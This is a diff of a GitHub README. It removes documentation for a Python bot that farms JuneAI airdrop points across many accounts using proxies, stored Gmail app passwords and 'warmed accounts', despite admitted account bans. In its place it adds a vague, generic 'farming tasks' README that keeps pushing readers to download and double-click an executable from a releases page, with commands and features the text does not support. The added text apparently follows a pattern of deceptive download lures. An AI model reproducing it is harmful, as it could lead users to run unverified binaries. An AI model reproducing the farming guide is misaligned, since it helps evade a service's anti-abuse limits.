@@ -1,209 +1,71 @@
-<a id="readme-top"></a>
+```markdown
+# 🌾 JuneAI-Soft - Simplify Your Farming Tasks Easily
 
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/wala2303/JuneAI-Soft/releases)
 
+## 🚀 Getting Started
 
+This guide helps you download and run JuneAI-Soft. This software automates farming tasks, making it easier for you to manage your farming activities.
 
-# <img src="icons/juneai.png" width="40" /> JuneAI Soft
+### ✔️ Features
 
-⚠️ **DISCLAIMER**  
-By using this software, you take full responsibility for your actions.  
-During early testing **3 out of 9 accounts were blocked due to automation**.  
-Use this software **at your own risk**.
+- Automates repetitive farming tasks.
+- User-friendly command-line interface.
+- Compatible with various farming tools.
+- Supports integration with AskJune.ai.
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+## 📥 Download & Install
 
+To get started, visit the link below to download the software:
 
+[Download JuneAI-Soft](https://github.com/wala2303/JuneAI-Soft/releases)
 
-## About JuneAI Soft
+Once on the releases page, you will see different versions of the software. Click on the version you need, then look for the executable file. Download that file to your computer.
 
-**JuneAI Soft** is a fully automated tool for farming points in the **JuneAI** project. Originally created for personal use, it is now shared on GitHub as a portfolio project. These points can potentially be used for project airdrops.
+### 🔧 System Requirements
 
-**Key features:**  
-- Supports multiple accounts running in parallel.  
-- Automates text, image, and video requests, creating new chats until points stop accumulating.  
-- Tracks daily account limits automatically.  
-- Displays up-to-date points for each account in a clean TUI table.  
-- Switches seamlessly between different request modules for maximum efficiency.
+- Operating System: Windows 10 or later, macOS Catalina or later, or a modern Linux distribution.
+- RAM: At least 2 GB of RAM.
+- Disk Space: Minimum of 100 MB free space.
 
-**JuneAI Soft** saves time, simplifies multi-account management, and provides a transparent interface for point farming.
+## 📂 How to Run
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+After downloading the file:
 
+1. Locate the downloaded file in your computer's downloads folder.
+2. Double-click the executable file to start the application.
+3. Follow the on-screen instructions to set up the software.
 
+### ⚙️ Using JuneAI-Soft
 
-## 📦 Installation Guide
+Upon launching, you will see a command prompt window. Here are some basic commands to get you started:
 
-### 1️⃣ Install Python
-Install **Python 3.13.3** and **make sure to add it to PATH**.
+- `start farming`: Begins the automation process.
+- `check status`: Shows current farming status.
+- `stop farming`: Ends currently running tasks.
 
-🔗 Download: https://www.python.org/downloads/
+For a detailed list of commands and usage, check the documentation linked on the Releases page.
 
-### 2️⃣ Install dependencies
+## 📖 Support & Feedback
 
-After installing Python, run:
+If you need help, you can reach out through the Issues section on our GitHub repository. We welcome your feedback as well.
 
-- `install.bat` — installs required Python dependencies  
-- `install browser.bat` — installs the browser required for the software  
+## 🌐 Additional Resources
 
-⚠️ **Both steps are mandatory**
+Explore topics associated with JuneAI-Soft:
 
-### 3️⃣ Add accounts
-Open the file:
+- [AskJune.ai](https://askjune.ai)
+- Crypto automation resources
+- Farming automation guides
 
+## 💻 Contributing
+
+If you're interested in contributing, please refer to our contribution guidelines in the repository. We appreciate any enhancements or suggestions.
+
+## 📄 License
+
+JuneAI-Soft is open-source software. You are free to use it under the terms mentioned in the license file found in the repository.
+
+----
+To download the software again or check for updates, visit: [Download JuneAI-Soft](https://github.com/wala2303/JuneAI-Soft/releases)
 ```
-src/profiles.json
-```
-
-Add emails associated with your **June** accounts.
-
-### 4️⃣ First launch & login
-Start the software **only via**:
-
-```
-start.bat
-```
-
-> Running without `start.bat` may cause library errors.
-
-Steps inside the app:
-1. Select **Launch profile**
-2. Open each profile
-3. Register or log in to the corresponding **June** account  
-   - Profile email **must match** the June account email
-
-### 5️⃣ Start farming
-Once all profiles are logged in:
-- Select **Start farm** from the menu
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-
-## ♻️ Updating the soft
-
-To avoid re-login after updating to a new version:
-
-```
-Copy the folder:
-src/profiles
-```
-
-Into the new version of the software.
-
-📌 This folder contains **browser cookies** for each profile.
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-
-
-## 📄 profiles.json structure
-
-Example:
-
-```json
-[
-   {
-       "email": "aviasales@gmail.com",
-       "points": 22491,
-       "login": false,
-       "proxy": "",
-       "imapPassword": ""
-   },
-   {
-       "email": "aviasales2@gmail.com",
-       "points": 222,
-       "login": false,
-       "proxy": "",
-       "imapPassword": "abcd abcd abcd abcd"
-   }
-]
-```
-
-### Field description:
-- **email** — June account email (used for logging and IMAP auto-login)
-- **points** — current points (auto-detected and updated)
-- **login** — session state (used for auto-login)
-- **proxy** — proxy settings  
-  ⚠️ Barely tested — you may need to adjust logic (`soft.py`, line ~89)
-- **imapPassword** — IMAP app password for auto-login
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-
-
-## ⚙️ Configuration
-
-You can customize colors and some settings in:
-
-```
-config.yaml
-```
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-
-
-## 📬 IMAP Auto-login Guide (Gmail)
-
-Allows the software to automatically fetch login codes from email.
-
-### Steps:
-1. Enable **2FA**  
-   https://myaccount.google.com/security
-
-2. Create an **App Password**  
-   https://myaccount.google.com/apppasswords  
-   (Name can be anything)
-
-3. Paste the generated password into:
-
-```
-src/profiles.json → imapPassword
-```
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-
-
-## ❗ Notes
-- Automation always carries risk
-- Use fresh or warmed accounts
-- Proxies are recommended for large-scale usage
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-
-
-## 🗂️ Project Structure
-
-Below is the folder and file structure of the JuneAI Soft project, with a brief description of each file:
-```
-start.bat          # Batch file to launch the soft with the virtual environment and settings
-config.yaml        # Configuration: colors, thread count, delays
-venv/              # Python virtual environment containing installed dependencies
-src/
-├─ main.py           # Entry point: TUI control panel, user interaction, account management
-├─ soft.py           # Launches profiles, manages browser sessions, reads/updates points, handles auto-login
-├─ launcher.py       # Runs multiple profiles in parallel with thread limits and delays
-├─ grind.py          # Automates actions for points farming: text, image, video
-├─ imap.py           # Fetches verification codes via IMAP for auto-login
-├─ autologin/
-│  ├─ __init__.py
-│  ├─ auto_login.py   # Human-like clicks on login buttons
-│  ├─ email_input.py  # Enters email in login forms
-│  └─ login_check.py  # Sets 'login' status in profiles.json
-├─ prompts/
-│  ├─ text.txt        # Text prompts, 1 per line
-│  ├─ images.txt      # Image prompts, 1 per line
-│  └─ videos.txt      # Video prompts, 1 per line
-├─ profiles/          # Contains profile folders with cookies/session data
-└─ profiles.json      # Stores account info: email, points, login state, proxy, imapPassword
-```
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
-
-
-
-## ⭐ Support
-If this project helped you — consider starring the repository 🙂
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
